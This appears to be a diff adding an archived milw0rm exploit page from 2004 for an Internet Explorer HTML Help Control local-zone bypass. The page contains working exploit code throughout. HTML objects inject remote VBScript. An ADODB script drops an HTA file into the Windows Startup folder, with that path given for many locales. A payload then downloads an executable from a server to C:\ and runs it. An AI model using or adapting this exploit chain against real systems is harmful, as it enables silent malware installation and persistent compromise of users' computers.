@@ -1,0 +1,87 @@
+<html>
+<head>
+<title>MS Internet Explorer (<= XP SP2) HTML Help Control Local Zone Bypass</title>
+<pre>
+//  sp2rc.htm  //
+
+&lt;OBJECT id=&quot;localpage&quot; type=&quot;application/x-oleobject&quot; 
+classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; height=7%
+style=&quot;position:absolute;top:140;left:72;z-index:100;&quot; 
+codebase=&quot;hhctrl.ocx#Version=5,2,3790,1194&quot; width=&quot;7%&quot;&gt;
+&lt;PARAM name=&quot;Command&quot; value=&quot;Related Topics, MENU&quot;&gt;
+&lt;PARAM name=&quot;Button&quot; value=&quot;Text:Just a button&quot;&gt;
+&lt;PARAM name=&quot;Window&quot; value=&quot;$global_blank&quot;&gt;
+&lt;PARAM name=&quot;Item1&quot; value=&quot;command;file://C:\WINDOWS\
+PCHealth\HelpCtr\System\blurbs\tools.htm&quot;&gt;
+&lt;/OBJECT&gt;
+
+&lt;OBJECT id=&quot;inject&quot; type=&quot;application/x-oleobject&quot;
+classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; height=7%
+style=&quot;position:absolute;top:140;left:72;z-index:100;&quot;
+codebase=&quot;hhctrl.ocx#Version=5,2,3790,1194&quot; width=&quot;7%&quot;&gt;
+&lt;PARAM name=&quot;Command&quot; value=&quot;Related Topics, MENU&quot;&gt;
+&lt;PARAM name=&quot;Button&quot; value=&quot;Text:Just a button&quot;&gt;
+&lt;PARAM name=&quot;Window&quot; value=&quot;$global_blank&quot;&gt;
+&lt;PARAM name=&quot;Item1&quot; value='command;javascript:
+execScript(&quot;document.write(\&quot;&lt;script language=\\\&quot;vbscript\\\&quot;
+src=\\\&quot;http://site/writehta.txt\\\&quot;\&quot;+String.fromCharCode(62)+\&quot;
+&lt;/scr\&quot;+\&quot;ipt\&quot;+String.fromCharCode(62))&quot;)'&gt;
+&lt;/OBJECT&gt;
+
+&lt;script&gt;
+localpage.HHClick();
+setTimeout(&quot;inject.HHClick()&quot;,100);
+&lt;/script&gt;
+
+//  writehta.txt  //
+
+Dim Conn, rs
+Set Conn = CreateObject(&quot;ADODB.Connection&quot;)
+Conn.Open &quot;Driver={Microsoft Text Driver (*.txt; *.csv)};&quot; &amp; _
+&quot;Dbq=http://server;&quot; &amp; _
+&quot;Extensions=asc,csv,tab,txt;&quot; &amp; _
+&quot;Persist Security Info=False&quot;
+Dim sql
+sql = &quot;SELECT * from foobar.txt&quot;
+set rs = conn.execute(sql)
+set rs =CreateObject(&quot;ADODB.recordset&quot;)
+rs.Open &quot;SELECT * from foobar.txt&quot;, conn
+rs.Save
+&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta&quot;, adPersistXML
+// Spanish     \Documents and Settings\All Users\Menu Inicio\Programas\Inicio\
+// French       \Documents and Settings\All Users\Menu Démarrer\Programmes\Démarrage
+// Danish      \Documents and Settings\All Users\Menuen Start\Programmer\Start\
+// Dutch        \Documents and Settings\All Users\Menu Start\Programma's\Opstarten\
+// Polish        \Documents and Settings\All Users\Menu Start\Programy\Autostart\
+// Italian       \Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\
+// Finn           \Documents and Settings\All Users\Kaynnista-valikko\Ohjelmat\Kaynnistys\
+// Turkish      \Documents and Settings\All Users\Start Menu\Programlar\BASLANGIC\ Turkish
+// Norwegian  \Documents and Settings\All Users\Start-meny\Programmer\Oppstart\
+// Swedish     \Documents and Settings\All Users\Start-menyn\Program\Autostart\
+// Portuguese \Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\
+// German     \Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\
+rs.close
+conn.close
+window.close
+
+//  f00bar.txt  //
+
+&quot;meaning less shit i had to put here&quot;
+&quot;&lt;script language=vbscript&gt; crap = &quot;&quot;&quot;
+&quot;&quot;&quot;: on error resume next: crap = &quot;&quot;&quot;
+&quot;&quot;&quot; : set o = CreateObject(&quot;&quot;msxml2.XMLHTTP&quot;&quot;) : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : o.open &quot;&quot;GET&quot;&quot;,&quot;&quot;http://server/malware.exe&quot;&quot;,False : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : o.send : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : set s = createobject(&quot;&quot;adodb.stream&quot;&quot;) : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : s.type=1 : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : s.open : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : s.write o.responseBody : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : s.savetofile &quot;&quot;C:\malware.exe&quot;&quot;,2 : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : Set ws = CreateObject(&quot;&quot;WScript.Shell&quot;&quot;) : crap=&quot;&quot;&quot;
+&quot;&quot;&quot; : ws.Run &quot;&quot;C:\malware.exe&quot;&quot;, 3, FALSE : crap=&quot;&quot;&quot;
+&quot;&quot;&quot;&lt;/script&gt; crap=&quot;&quot;&quot;
+
+# milw0rm.com [2004-12-25]
+</pre>
+</html>
+
